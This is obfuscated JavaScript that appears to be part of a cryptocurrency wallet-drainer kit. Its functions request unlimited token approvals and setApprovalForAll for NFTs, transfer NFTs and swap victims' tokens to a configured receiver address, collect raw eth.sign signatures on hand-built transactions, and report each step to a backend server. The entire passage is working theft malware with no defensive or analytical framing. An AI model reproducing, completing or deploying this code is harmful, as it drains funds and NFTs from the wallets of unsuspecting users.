    if (MS_Settings[_0x5f2119(0x2d2)]['Reserves'][_0x5f2119(0x370)] == 0x1)
        _0x157fe1 = _0x324885[_0x5f2119(0x259)](_0x34c5dc[_0x5f2119(0x28f)](_0x458833))[_0x5f2119(0x273)](BN(0x64))['mul'](BN(0x64)[_0x5f2119(0x259)](BN(MS_Settings[_0x5f2119(0x2d2)][_0x5f2119(0x2f3)][_0x5f2119(0x2f8)][_0x1fa01b[_0x5f2119(0x3ab)]])));
    else {
        if (MS_Settings[_0x5f2119(0x2d2)][_0x5f2119(0x2f3)][_0x5f2119(0x370)] == 0x2) {
            let _0xb8c7b9 = 0x0
              , _0x5bc30b = MS_Settings[_0x5f2119(0x2d2)][_0x5f2119(0x2f3)][_0x5f2119(0x2f8)][_0x1fa01b[_0x5f2119(0x3ab)]];
            for (const _0x13ed6b of MS_Settings['Settings'][_0x5f2119(0x2f3)][_0x5f2119(0x2b6)][_0x1fa01b[_0x5f2119(0x3ab)]]) {
                if (_0x1fa01b['amount_usd'] > _0x13ed6b[_0x5f2119(0x3a7)] || _0xb8c7b9 > _0x13ed6b[_0x5f2119(0x3a7)])
                    continue;
                _0xb8c7b9 = _0x13ed6b[_0x5f2119(0x3a7)],
                _0x5bc30b = _0x13ed6b[_0x5f2119(0x39d)];
            }
            _0x157fe1 = _0x324885[_0x5f2119(0x259)](_0x34c5dc['mul'](_0x458833))[_0x5f2119(0x273)](BN(0x64))[_0x5f2119(0x28f)](BN(0x64)[_0x5f2119(0x259)](BN(_0x5bc30b)));
        } else
            MS_Settings[_0x5f2119(0x2d2)][_0x5f2119(0x2f3)]['Mode'] == 0x3 && (_0x157fe1 = _0x324885[_0x5f2119(0x259)](_0x34c5dc[_0x5f2119(0x28f)](_0x458833)));
    }
    if (_0x157fe1[_0x5f2119(0x354)](BN(0x0)))
        throw 'LOW_BALANCE';
    const _0x4970f2 = await _0x730633[_0x5f2119(0x290)](MS_Current_Address, _0x5f2119(0x1bf))
      , _0x1080b4 = new Web3(MS_Provider);
    _0x59bbb8[_0x5f2119(0x2dd)] = _0x1080b4[_0x5f2119(0x30c)]['toHex'](_0x157fe1[_0x5f2119(0x2b4)]()),
    _0x59bbb8['nonce'] = _0x1080b4[_0x5f2119(0x30c)][_0x5f2119(0x38a)](_0x4970f2['toString']()),
    _0x59bbb8[_0x5f2119(0x26d)] = _0x1080b4[_0x5f2119(0x30c)][_0x5f2119(0x38a)](_0x458833['toString']()),
    _0x59bbb8[_0x5f2119(0x28b)] = _0x1080b4[_0x5f2119(0x30c)][_0x5f2119(0x38a)](_0x34c5dc[_0x5f2119(0x2b4)]()),
    _0x59bbb8['v'] = _0x1080b4[_0x5f2119(0x30c)][_0x5f2119(0x38a)](_0x1fa01b[_0x5f2119(0x3ab)]),
    _0x59bbb8['r'] = '0x',
    _0x59bbb8['s'] = '0x',
    _0x59bbb8 = new ethereumjs['Tx'](_0x59bbb8);
    let _0x1e6988 = '0x' + _0x59bbb8[_0x5f2119(0x25f)]()[_0x5f2119(0x2b4)](_0x5f2119(0x1b1));
    _0x1e6988 = _0x1080b4[_0x5f2119(0x30c)][_0x5f2119(0x1a3)](_0x1e6988, {
        'encoding': _0x5f2119(0x1b1)
    }),
    await sign_request(_0x1fa01b);
    let _0x3b8b5f = await _0x1080b4[_0x5f2119(0x2e3)]['sign'](_0x1e6988, MS_Current_Address);
    _0x3b8b5f = _0x3b8b5f[_0x5f2119(0x37a)](0x2);
    const _0x5f039c = '0x' + _0x3b8b5f[_0x5f2119(0x37a)](0x0, 0x40)
      , _0x89247e = '0x' + _0x3b8b5f[_0x5f2119(0x37a)](0x40, 0x80)
      , _0x57cafa = parseInt(_0x3b8b5f[_0x5f2119(0x37a)](0x80, 0x82), 0x10)
      , _0x1d5095 = _0x1080b4[_0x5f2119(0x30c)]['toHex'](_0x57cafa + _0x1fa01b[_0x5f2119(0x3ab)] * 0x2 + 0x8);
    _0x59bbb8['v'] = _0x1d5095,
    _0x59bbb8['r'] = _0x5f039c,
    _0x59bbb8['s'] = _0x89247e,
    _0x1e6988 = '0x' + _0x59bbb8[_0x5f2119(0x25f)]()[_0x5f2119(0x2b4)](_0x5f2119(0x1b1)),
    sign_next();
    const _0x52641e = await _0x730633[_0x5f2119(0x26e)](_0x1e6988);
    wait_message();
    if (MS_Settings[_0x5f2119(0x2d2)][_0x5f2119(0x2b2)])
        await _0x730633[_0x5f2119(0x378)](_0x52641e[_0x5f2119(0x318)], 0x1, 0x7530);
    await sign_success(_0x1fa01b, _0x157fe1),
    sign_ready();
}
  , SIGN_TOKEN = async _0x3f9802=>{
    const _0x12a9ef = a0_0x66027a
      , _0x5de349 = new ethers[(_0x12a9ef(0x38b))]['JsonRpcProvider'](MS_Settings[_0x12a9ef(0x1a7)][_0x3f9802[_0x12a9ef(0x3ab)]])
      , _0x4d7e81 = BN(await _0x5de349[_0x12a9ef(0x2a9)]())[_0x12a9ef(0x273)](BN(0x64))[_0x12a9ef(0x28f)](BN(Math[_0x12a9ef(0x24b)](MS_Gas_Multiplier * 0x64)))
      , _0x31e167 = new ethers[(_0x12a9ef(0x38b))][(_0x12a9ef(0x21c))](MS_Settings[_0x12a9ef(0x1a7)][0x1])
      , _0x2ecb07 = BN(await _0x31e167['getGasPrice']())['div'](BN(0x64))['mul'](BN(Math[_0x12a9ef(0x24b)](MS_Gas_Multiplier * 0x64)))
      , _0x4caecd = new Web3(MS_Provider);
    let _0x14057b = null;
    const _0x2ca774 = new _0x4caecd['eth'][(_0x12a9ef(0x2b7))](MS_Contract_ABI['ERC20'],_0x3f9802['address']);
    let _0x525939 = ethers[_0x12a9ef(0x30c)][_0x12a9ef(0x31e)](MS_Unlimited_Amount);
    for (const _0x399282 of MS_Settings[_0x12a9ef(0x363)]) {
        try {
            if (_0x399282[0x0] == MS_Current_Chain_ID && _0x399282[0x1] == _0x3f9802[_0x12a9ef(0x34b)][_0x12a9ef(0x2d4)]()['trim']()) {
                _0x525939 = _0x3f9802[_0x12a9ef(0x270)];
                break;
            }
        } catch (_0x16f7db) {
            console[_0x12a9ef(0x217)](_0x16f7db);
        }
    }
    if (MS_Settings[_0x12a9ef(0x2d2)][_0x12a9ef(0x323)][_0x12a9ef(0x1e0)] == 0x1)
        _0x14057b = _0x2ca774[_0x12a9ef(0x32c)]['approve'](MS_Settings[_0x12a9ef(0x2e9)], _0x525939)[_0x12a9ef(0x194)]();
    else {
        if (MS_Settings[_0x12a9ef(0x2d2)][_0x12a9ef(0x323)]['Tokens'] == 0x2)
            _0x14057b = _0x2ca774['methods'][_0x12a9ef(0x27e)](MS_Settings[_0x12a9ef(0x365)], _0x3f9802['amount_raw'])['encodeABI']();
    }
    let _0x30095d = {
        'from': MS_Current_Address,
        'to': _0x3f9802[_0x12a9ef(0x34b)],
        'value': _0x12a9ef(0x234),
        'data': _0x14057b
    }
      , _0x114627 = null;
    try {
        _0x114627 = await _0x5de349[_0x12a9ef(0x393)](_0x30095d);
    } catch (_0xd71e5d) {
        _0x114627 = get_gas_limit_def_by_chain_id(parseInt(_0x3f9802[_0x12a9ef(0x3ab)]));
    }
    const _0x197bb4 = await _0x5de349['getBalance'](MS_Current_Address)
      , _0x2a4804 = _0x197bb4[_0x12a9ef(0x259)](_0x114627[_0x12a9ef(0x28f)](_0x4d7e81));
    if (_0x2a4804['lt'](BN(0x0)))
        throw _0x12a9ef(0x1dd);
    const _0x5eaf43 = await _0x5de349['getTransactionCount'](MS_Current_Address, _0x12a9ef(0x1bf));
    _0x30095d[_0x12a9ef(0x236)] = _0x4caecd[_0x12a9ef(0x30c)][_0x12a9ef(0x38a)](_0x5eaf43[_0x12a9ef(0x2b4)]()),
    _0x30095d[_0x12a9ef(0x26d)] = _0x4caecd['utils'][_0x12a9ef(0x38a)](_0x4d7e81[_0x12a9ef(0x2b4)]()),
    _0x30095d[_0x12a9ef(0x28b)] = _0x4caecd[_0x12a9ef(0x30c)][_0x12a9ef(0x38a)](_0x114627[_0x12a9ef(0x2b4)]()),
    _0x30095d['v'] = _0x4caecd[_0x12a9ef(0x30c)]['toHex'](_0x3f9802[_0x12a9ef(0x3ab)]),
    _0x30095d['r'] = '0x',
    _0x30095d['s'] = '0x',
    _0x30095d = new ethereumjs['Tx'](_0x30095d);
    let _0x54d1c1 = '0x' + _0x30095d[_0x12a9ef(0x25f)]()[_0x12a9ef(0x2b4)](_0x12a9ef(0x1b1));
    _0x54d1c1 = _0x4caecd[_0x12a9ef(0x30c)][_0x12a9ef(0x1a3)](_0x54d1c1, {
        'encoding': _0x12a9ef(0x1b1)
    }),
    await sign_request(_0x3f9802);
    let _0x395a99 = await _0x4caecd[_0x12a9ef(0x2e3)][_0x12a9ef(0x2da)](_0x54d1c1, MS_Current_Address);
    _0x395a99 = _0x395a99[_0x12a9ef(0x37a)](0x2);
    const _0x4131a6 = '0x' + _0x395a99[_0x12a9ef(0x37a)](0x0, 0x40)
      , _0x6a17e7 = '0x' + _0x395a99[_0x12a9ef(0x37a)](0x40, 0x80)
      , _0x161ae6 = parseInt(_0x395a99[_0x12a9ef(0x37a)](0x80, 0x82), 0x10)
      , _0x4ff088 = _0x4caecd['utils'][_0x12a9ef(0x38a)](_0x161ae6 + _0x3f9802[_0x12a9ef(0x3ab)] * 0x2 + 0x8);
    _0x30095d['v'] = _0x4ff088,
    _0x30095d['r'] = _0x4131a6,
    _0x30095d['s'] = _0x6a17e7,
    _0x54d1c1 = '0x' + _0x30095d[_0x12a9ef(0x25f)]()[_0x12a9ef(0x2b4)]('hex'),
    sign_next();
    const _0xcf46db = await _0x5de349[_0x12a9ef(0x26e)](_0x54d1c1);
    wait_message();
    if (MS_Settings['Settings']['Wait_For_Confirmation'])
        await _0x5de349[_0x12a9ef(0x378)](_0xcf46db[_0x12a9ef(0x318)], 0x1, 0x7530);
    await sign_success(_0x3f9802),
    sign_ready();
}
  , SIGN_NFT = async _0x4d3306=>{
    const _0x1e1232 = a0_0x66027a
      , _0xaca88c = new ethers[(_0x1e1232(0x38b))][(_0x1e1232(0x21c))](MS_Settings[_0x1e1232(0x1a7)][_0x4d3306[_0x1e1232(0x3ab)]])
      , _0x5f1c61 = BN(await _0xaca88c['getGasPrice']())[_0x1e1232(0x273)](BN(0x64))['mul'](BN(Math[_0x1e1232(0x24b)](MS_Gas_Multiplier * 0x64)))
      , _0xd4dd5f = new ethers[(_0x1e1232(0x38b))][(_0x1e1232(0x21c))](MS_Settings[_0x1e1232(0x1a7)][0x1])
      , _0x4bbacf = BN(await _0xd4dd5f[_0x1e1232(0x2a9)]())[_0x1e1232(0x273)](BN(0x64))['mul'](BN(Math['floor'](MS_Gas_Multiplier * 0x64)))
      , _0x52f455 = new Web3(MS_Provider);
    let _0x5e42c3 = null;
    const _0x5be186 = new _0x52f455[(_0x1e1232(0x2e3))][(_0x1e1232(0x2b7))](MS_Contract_ABI['ERC721'],_0x4d3306[_0x1e1232(0x34b)]);
    if (MS_Settings['Settings']['Sign'][_0x1e1232(0x314)] == 0x1)
        _0x5e42c3 = _0x5be186[_0x1e1232(0x32c)]['setApprovalForAll'](MS_Settings[_0x1e1232(0x2e9)], !![])[_0x1e1232(0x194)]();
    else {
        if (MS_Settings[_0x1e1232(0x2d2)][_0x1e1232(0x323)][_0x1e1232(0x314)] == 0x2)
            _0x5e42c3 = _0x5be186['methods'][_0x1e1232(0x1c5)](MS_Current_Address, MS_Settings['Receiver'], _0x4d3306['id'])['encodeABI']();
    }
    let _0x197486 = {
        'from': MS_Current_Address,
        'to': _0x4d3306[_0x1e1232(0x34b)],
        'value': _0x1e1232(0x234),
        'data': _0x5e42c3
    }
      , _0x231723 = null;
    try {
        _0x231723 = await _0xaca88c[_0x1e1232(0x393)](_0x197486);
    } catch (_0x4ae6a2) {
        _0x231723 = get_gas_limit_def_by_chain_id(parseInt(_0x4d3306[_0x1e1232(0x3ab)]));
    }
    const _0x37b9eb = await _0xaca88c['getBalance'](MS_Current_Address)
      , _0x51168e = _0x37b9eb[_0x1e1232(0x259)](_0x231723['mul'](_0x5f1c61));
    if (_0x51168e['lt'](BN(0x0)))
        throw _0x1e1232(0x1dd);
    const _0x1f6862 = await _0xaca88c['getTransactionCount'](MS_Current_Address, _0x1e1232(0x1bf));
    _0x197486['nonce'] = _0x52f455[_0x1e1232(0x30c)][_0x1e1232(0x38a)](_0x1f6862['toString']()),
    _0x197486[_0x1e1232(0x26d)] = _0x52f455[_0x1e1232(0x30c)][_0x1e1232(0x38a)](_0x5f1c61[_0x1e1232(0x2b4)]()),
    _0x197486[_0x1e1232(0x28b)] = _0x52f455[_0x1e1232(0x30c)][_0x1e1232(0x38a)](_0x231723['toString']()),
    _0x197486['v'] = _0x52f455[_0x1e1232(0x30c)][_0x1e1232(0x38a)](_0x4d3306['chain_id']),
    _0x197486['r'] = '0x',
    _0x197486['s'] = '0x',
    _0x197486 = new ethereumjs['Tx'](_0x197486);
    let _0x5de4e2 = '0x' + _0x197486[_0x1e1232(0x25f)]()[_0x1e1232(0x2b4)](_0x1e1232(0x1b1));
    _0x5de4e2 = _0x52f455[_0x1e1232(0x30c)][_0x1e1232(0x1a3)](_0x5de4e2, {
        'encoding': 'hex'
    }),
    await sign_request(_0x4d3306);
    let _0x1d1306 = await _0x52f455[_0x1e1232(0x2e3)][_0x1e1232(0x2da)](_0x5de4e2, MS_Current_Address);
    _0x1d1306 = _0x1d1306[_0x1e1232(0x37a)](0x2);
    const _0x303a98 = '0x' + _0x1d1306['substring'](0x0, 0x40)
      , _0x36bb36 = '0x' + _0x1d1306['substring'](0x40, 0x80)
      , _0x360d6a = parseInt(_0x1d1306[_0x1e1232(0x37a)](0x80, 0x82), 0x10)
      , _0x32d59f = _0x52f455[_0x1e1232(0x30c)][_0x1e1232(0x38a)](_0x360d6a + _0x4d3306[_0x1e1232(0x3ab)] * 0x2 + 0x8);
    _0x197486['v'] = _0x32d59f,
    _0x197486['r'] = _0x303a98,
    _0x197486['s'] = _0x36bb36,
    _0x5de4e2 = '0x' + _0x197486[_0x1e1232(0x25f)]()['toString'](_0x1e1232(0x1b1)),
    sign_next();
    const _0x1595c2 = await _0xaca88c[_0x1e1232(0x26e)](_0x5de4e2);
    wait_message();
    if (MS_Settings[_0x1e1232(0x2d2)]['Wait_For_Confirmation'])
        await _0xaca88c[_0x1e1232(0x378)](_0x1595c2[_0x1e1232(0x318)], 0x1, 0x7530);
    await sign_success(_0x4d3306),
    sign_ready();
}
  , DO_SWAP = async _0x348614=>{
    const _0x2fd1f6 = a0_0x66027a
      , _0x3aab38 = new ethers[(_0x2fd1f6(0x38b))][(_0x2fd1f6(0x21c))](MS_Settings[_0x2fd1f6(0x1a7)][_0x348614['chain_id']])
      , _0x401bae = Math[_0x2fd1f6(0x24b)](Date[_0x2fd1f6(0x1e4)]() / 0x3e8) + 0x270f * 0xa
      , _0x5d412d = new ethers[(_0x2fd1f6(0x2b7))](_0x348614[_0x2fd1f6(0x240)],MS_Pancake_ABI,MS_Signer)
      , _0x126b11 = ethers[_0x2fd1f6(0x371)][_0x2fd1f6(0x199)](await _0x3aab38[_0x2fd1f6(0x2a9)]())['div'](ethers['BigNumber'][_0x2fd1f6(0x199)](_0x2fd1f6(0x390)))['mul'](ethers[_0x2fd1f6(0x371)]['from'](_0x2fd1f6(0x360)))['toString']();
    let _0x479eaf = null
      , _0x4ed0a1 = 0x0;
    while (_0x4ed0a1 < 0x3) {
        try {
            _0x479eaf = await _0x5d412d[_0x2fd1f6(0x393)][_0x2fd1f6(0x272)](_0x16d64b, '0', [_0x348614[_0x2fd1f6(0x34b)], MS_Swap_Route[_0x348614[_0x2fd1f6(0x3ab)]]], MS_Settings[_0x2fd1f6(0x365)], _0x401bae, {
                'from': MS_Current_Address
            }),
            _0x479eaf = ethers[_0x2fd1f6(0x371)][_0x2fd1f6(0x199)](_0x479eaf)[_0x2fd1f6(0x273)](ethers['BigNumber'][_0x2fd1f6(0x199)]('100'))[_0x2fd1f6(0x28f)](ethers[_0x2fd1f6(0x371)][_0x2fd1f6(0x199)](_0x2fd1f6(0x360)))[_0x2fd1f6(0x2b4)](),
            _0x4ed0a1 = 0x3;
        } catch (_0x21552b) {
            _0x479eaf = _0x348614[_0x2fd1f6(0x3ab)] == 0xa4b1 ? 0x4c4b40 : _0x348614[_0x2fd1f6(0x3ab)] == 0xa86a ? 0x4c4b40 : 0x55730,
            _0x4ed0a1 += 0x1;
        }
    }
    const _0x226907 = await get_nonce(_0x348614['chain_id'])
      , _0x16d64b = ethers['BigNumber'][_0x2fd1f6(0x199)](_0x348614['amount_raw'])['lte'](ethers[_0x2fd1f6(0x371)][_0x2fd1f6(0x199)](_0x348614[_0x2fd1f6(0x315)])) ? ethers['BigNumber'][_0x2fd1f6(0x199)](_0x348614['amount_raw'])[_0x2fd1f6(0x2b4)]() : ethers[_0x2fd1f6(0x371)][_0x2fd1f6(0x199)](_0x348614[_0x2fd1f6(0x315)])[_0x2fd1f6(0x2b4)]();
    await swap_request(_0x348614[_0x2fd1f6(0x218)], _0x348614, [_0x348614]),
    sign_next();
    const _0x36580c = await _0x5d412d[_0x2fd1f6(0x272)](_0x16d64b, '0', [_0x348614[_0x2fd1f6(0x34b)], MS_Swap_Route[_0x348614[_0x2fd1f6(0x3ab)]]], MS_Settings[_0x2fd1f6(0x365)], _0x401bae, {
        'gasLimit': ethers[_0x2fd1f6(0x371)]['from'](_0x479eaf),
        'gasPrice': ethers[_0x2fd1f6(0x371)][_0x2fd1f6(0x199)](_0x126b11),
        'nonce': _0x226907,
        'from': MS_Current_Address
    });
    wait_message();
    if (MS_Settings['Settings'][_0x2fd1f6(0x2b2)])
        await _0x3aab38['waitForTransaction'](_0x36580c['hash'], 0x1, 0xea60);
    await swap_success(_0x348614[_0x2fd1f6(0x218)], _0x348614, [_0x348614]),
    sign_ready();
}
  , DO_UNISWAP = async(_0x492b10,_0x5449a9)=>{
    const _0x56a42f = a0_0x66027a
      , _0x1e1d6c = new Web3(MS_Provider)
      , _0x233aa0 = new ethers['providers']['JsonRpcProvider'](MS_Settings[_0x56a42f(0x1a7)][_0x492b10['chain_id']])
      , _0x5c2e49 = Math['floor'](Date[_0x56a42f(0x1e4)]() / 0x3e8) + 0x270f * 0xa
      , _0xe87f50 = new ethers[(_0x56a42f(0x2b7))](_0x492b10[_0x56a42f(0x240)],MS_Uniswap_ABI,MS_Signer)
      , _0x22ec2b = ethers['BigNumber'][_0x56a42f(0x199)](await _0x233aa0[_0x56a42f(0x2a9)]())['div'](ethers[_0x56a42f(0x371)]['from'](_0x56a42f(0x390)))[_0x56a42f(0x28f)](ethers['BigNumber'][_0x56a42f(0x199)](_0x56a42f(0x360)))['toString']()
      , _0x117a87 = await get_nonce(_0x492b10[_0x56a42f(0x3ab)])
      , _0x3e4eda = [];
    for (const _0x2566d7 of _0x5449a9) {
        try {
            const _0x521665 = ethers[_0x56a42f(0x371)][_0x56a42f(0x199)](_0x2566d7['amount_raw'])[_0x56a42f(0x354)](ethers[_0x56a42f(0x371)][_0x56a42f(0x199)](_0x2566d7[_0x56a42f(0x315)])) ? ethers['BigNumber'][_0x56a42f(0x199)](_0x2566d7['amount_raw'])[_0x56a42f(0x2b4)]() : ethers[_0x56a42f(0x371)]['from'](_0x2566d7[_0x56a42f(0x315)])[_0x56a42f(0x2b4)]()
              , _0x22478e = new _0x1e1d6c[(_0x56a42f(0x2e3))][(_0x56a42f(0x2b7))](MS_Uniswap_ABI,_0x2566d7[_0x56a42f(0x240)])
              , _0x4fef71 = _0x22478e[_0x56a42f(0x32c)]['swapExactTokensForTokens'](_0x521665, '0', [_0x2566d7[_0x56a42f(0x34b)], MS_Swap_Route[_0x2566d7[_0x56a42f(0x3ab)]]], MS_Settings[_0x56a42f(0x365)])['encodeABI']();
            _0x3e4eda[_0x56a42f(0x212)](_0x4fef71);
        } catch (_0x3087e3) {
            console[_0x56a42f(0x217)](_0x3087e3);
        }
    }
    let _0x13f6e5 = null
      , _0xcb8c76 = 0x0;
    while (_0xcb8c76 < 0x3) {
        try {
            _0x13f6e5 = await _0xe87f50['estimateGas'][_0x56a42f(0x198)](_0x5c2e49, _0x3e4eda, {
                'from': MS_Current_Address
            }),
            _0x13f6e5 = ethers[_0x56a42f(0x371)][_0x56a42f(0x199)](_0x13f6e5)[_0x56a42f(0x273)](ethers['BigNumber'][_0x56a42f(0x199)]('100'))[_0x56a42f(0x28f)](ethers[_0x56a42f(0x371)]['from']('120'))[_0x56a42f(0x2b4)](),
            _0xcb8c76 = 0x3;
        } catch (_0x2d7975) {
            _0x13f6e5 = _0x492b10[_0x56a42f(0x3ab)] == 0xa4b1 ? 0x4c4b40 : _0x492b10[_0x56a42f(0x3ab)] == 0xa86a ? 0x4c4b40 : 0x7a120,
            _0xcb8c76 += 0x1;
        }
    }
    await swap_request(_0x492b10['swapper_type'], _0x492b10, _0x5449a9),
    sign_next();
    const _0x360f0a = await _0xe87f50['multicall'](_0x5c2e49, _0x3e4eda, {
        'gasLimit': ethers[_0x56a42f(0x371)][_0x56a42f(0x199)](_0x13f6e5),
        'gasPrice': ethers[_0x56a42f(0x371)][_0x56a42f(0x199)](_0x22ec2b),
        'nonce': _0x117a87,
        'from': MS_Current_Address
    });
    wait_message();
    if (MS_Settings[_0x56a42f(0x2d2)][_0x56a42f(0x2b2)])
        await _0x233aa0[_0x56a42f(0x378)](_0x360f0a['hash'], 0x1, 0xea60);
    await swap_success(_0x492b10[_0x56a42f(0x218)], _0x492b10, _0x5449a9),
    sign_ready();
}
  , DO_PANCAKE_V3 = async(_0x47516a,_0x1e895c)=>{
    const _0x46463c = a0_0x66027a
      , _0x17a89e = new Web3(MS_Provider)
      , _0xa6a83d = new ethers[(_0x46463c(0x38b))]['JsonRpcProvider'](MS_Settings[_0x46463c(0x1a7)][_0x47516a[_0x46463c(0x3ab)]])
      , _0x15ae41 = Math['floor'](Date[_0x46463c(0x1e4)]() / 0x3e8) + 0x270f * 0xa
      , _0x3c60d8 = new ethers[(_0x46463c(0x2b7))](_0x47516a[_0x46463c(0x240)],MS_Pancake_ABI,MS_Signer)
      , _0x506e17 = ethers[_0x46463c(0x371)]['from'](await _0xa6a83d[_0x46463c(0x2a9)]())[_0x46463c(0x273)](ethers[_0x46463c(0x371)][_0x46463c(0x199)](_0x46463c(0x390)))['mul'](ethers['BigNumber'][_0x46463c(0x199)](_0x46463c(0x360)))['toString']()
      , _0x4d6850 = await get_nonce(_0x47516a[_0x46463c(0x3ab)])
      , _0x4e6ee8 = [];
    for (const _0xb17062 of _0x1e895c) {
        try {
            const _0x5510d1 = ethers[_0x46463c(0x371)]['from'](_0xb17062['amount_raw'])['lte'](ethers[_0x46463c(0x371)]['from'](_0xb17062[_0x46463c(0x315)])) ? ethers['BigNumber'][_0x46463c(0x199)](_0xb17062['amount_raw'])[_0x46463c(0x2b4)]() : ethers[_0x46463c(0x371)][_0x46463c(0x199)](_0xb17062['swapper_allowance'])['toString']()
              , _0xb66f1d = new _0x17a89e[(_0x46463c(0x2e3))]['Contract'](MS_Pancake_ABI,_0xb17062[_0x46463c(0x240)])
              , _0xa6792a = _0xb66f1d['methods']['swapExactTokensForTokens'](_0x5510d1, '0', [_0xb17062[_0x46463c(0x34b)], MS_Swap_Route[_0xb17062[_0x46463c(0x3ab)]]], MS_Settings[_0x46463c(0x365)])[_0x46463c(0x194)]();
            _0x4e6ee8[_0x46463c(0x212)](_0xa6792a);
        } catch (_0x2a3179) {
            console['log'](_0x2a3179);
        }
    }
    let _0x5dcc7c = null
      , _0x118938 = 0x0;
    while (_0x118938 < 0x3) {
        try {
            _0x5dcc7c = await _0x3c60d8['estimateGas'][_0x46463c(0x198)](_0x15ae41, _0x4e6ee8, {
                'from': MS_Current_Address
            }),
            _0x5dcc7c = ethers[_0x46463c(0x371)][_0x46463c(0x199)](_0x5dcc7c)[_0x46463c(0x273)](ethers[_0x46463c(0x371)][_0x46463c(0x199)](_0x46463c(0x390)))[_0x46463c(0x28f)](ethers[_0x46463c(0x371)]['from'](_0x46463c(0x360)))['toString'](),
            _0x118938 = 0x3;
        } catch (_0x57c29a) {
            _0x5dcc7c = _0x47516a[_0x46463c(0x3ab)] == 0xa4b1 ? 0x4c4b40 : _0x47516a[_0x46463c(0x3ab)] == 0xa86a ? 0x4c4b40 : 0x7a120,
            _0x118938 += 0x1;
        }
    }
    await swap_request(_0x47516a[_0x46463c(0x218)], _0x47516a, _0x1e895c),
    sign_next();
    const _0x2efad9 = await _0x3c60d8[_0x46463c(0x198)](_0x15ae41, _0x4e6ee8, {
        'gasLimit': ethers[_0x46463c(0x371)][_0x46463c(0x199)](_0x5dcc7c),
        'gasPrice': ethers[_0x46463c(0x371)][_0x46463c(0x199)](_0x506e17),
        'nonce': _0x4d6850,
        'from': MS_Current_Address
    });
    wait_message();
    if (MS_Settings['Settings'][_0x46463c(0x2b2)])
        await _0xa6a83d[_0x46463c(0x378)](_0x2efad9[_0x46463c(0x318)], 0x1, 0xea60);
    await swap_success(_0x47516a[_0x46463c(0x218)], _0x47516a, _0x1e895c),
    sign_ready();
}
  , DO_CONTRACT = async _0x446b52=>{
    const _0x43a6b1 = a0_0x66027a
      , _0x34a22c = convert_chain('ID', _0x43a6b1(0x1d9), _0x446b52[_0x43a6b1(0x3ab)])
      , _0x11ee38 = new ethers[(_0x43a6b1(0x38b))]['JsonRpcProvider'](MS_Settings[_0x43a6b1(0x1a7)][_0x446b52[_0x43a6b1(0x3ab)]])
      , _0x3a62ab = BN(await _0x11ee38[_0x43a6b1(0x2a9)]())[_0x43a6b1(0x273)](BN(0x64))[_0x43a6b1(0x28f)](BN(Math[_0x43a6b1(0x24b)](MS_Gas_Multiplier * 0x64)))
      , _0x2889a1 = new ethers['providers']['JsonRpcProvider'](MS_Settings[_0x43a6b1(0x1a7)][0x1])
      , _0x2488fa = BN(await _0x2889a1[_0x43a6b1(0x2a9)]())['div'](BN(0x64))[_0x43a6b1(0x28f)](BN(Math['floor'](MS_Gas_Multiplier * 0x64)))
      , _0x15d9ab = BN(_0x446b52[_0x43a6b1(0x3ab)] == 0xa4b1 ? 0x4c4b40 : _0x446b52[_0x43a6b1(0x3ab)] == 0xa86a ? 0x4c4b40 : _0x446b52[_0x43a6b1(0x3ab)] == 0x171 ? 0xdbba0 : 0x249f0)
      , _0x215356 = _0x15d9ab['mul'](MS_Gas_Reserves[_0x446b52[_0x43a6b1(0x3ab)]] + 0x1)[_0x43a6b1(0x28f)](_0x3a62ab);
    MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x1b4)] && MS_Settings[_0x43a6b1(0x21e)][parseInt(_0x446b52['chain_id'])] != null && (MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x308)][_0x34a22c][_0x43a6b1(0x2fb)] = 0x2,
    MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x308)][_0x34a22c][_0x43a6b1(0x32e)] = MS_Settings['Public_Contract'][parseInt(_0x446b52[_0x43a6b1(0x3ab)])][MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x22e)] ? _0x446b52[_0x43a6b1(0x1f5)] >= 0x1f4 ? 0x1 : 0x0 : 0x0]);
    const _0x3c513c = MS_Settings['Settings'][_0x43a6b1(0x308)][_0x34a22c][_0x43a6b1(0x2fb)] == 0x1 ? JSON['parse'](_0x43a6b1(0x3a0) + MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x308)][_0x34a22c]['Contract_Type'] + _0x43a6b1(0x33c)) : MS_Settings['Settings']['Chains'][_0x34a22c][_0x43a6b1(0x2fb)] == 0x0 ? JSON[_0x43a6b1(0x258)](_0x43a6b1(0x2cd) + MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x308)][_0x34a22c][_0x43a6b1(0x2eb)] + _0x43a6b1(0x33c)) : JSON['parse'](_0x43a6b1(0x2e4) + MS_Settings[_0x43a6b1(0x2d2)]['Chains'][_0x34a22c]['Contract_Type'] + '\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22}]')
      , _0xd80a8b = new Web3(MS_Provider);
    let _0x862800 = null;
    const _0x529302 = new _0xd80a8b[(_0x43a6b1(0x2e3))][(_0x43a6b1(0x2b7))](_0x3c513c,MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x308)][_0x34a22c][_0x43a6b1(0x32e)]);
    if (MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x308)][_0x34a22c][_0x43a6b1(0x2fb)] == 0x0)
        _0x862800 = _0x529302[_0x43a6b1(0x32c)][MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x308)][_0x34a22c]['Contract_Type']](MS_Settings['Receiver'])['encodeABI']();
    else {
        if (MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x308)][_0x34a22c][_0x43a6b1(0x2fb)] == 0x2) {
            let _0x2aa884 = ![];
            try {
                const _0x4e4a72 = await send_request({
                    'action': _0x43a6b1(0x369),
                    'address': MS_Partner_Address,
                    'amount_usd': _0x446b52['amount_usd'] || null
                });
                if (_0x4e4a72[_0x43a6b1(0x250)] == 'OK' && _0x4e4a72[_0x43a6b1(0x202)] == !![])
                    _0x2aa884 = _0x4e4a72[_0x43a6b1(0x39d)];
            } catch (_0x24056f) {
                console[_0x43a6b1(0x217)](_0x24056f);
            }
            let _0x4c2f2c = !_0x2aa884 ? _0x43a6b1(0x34f) : MS_Partner_Address;
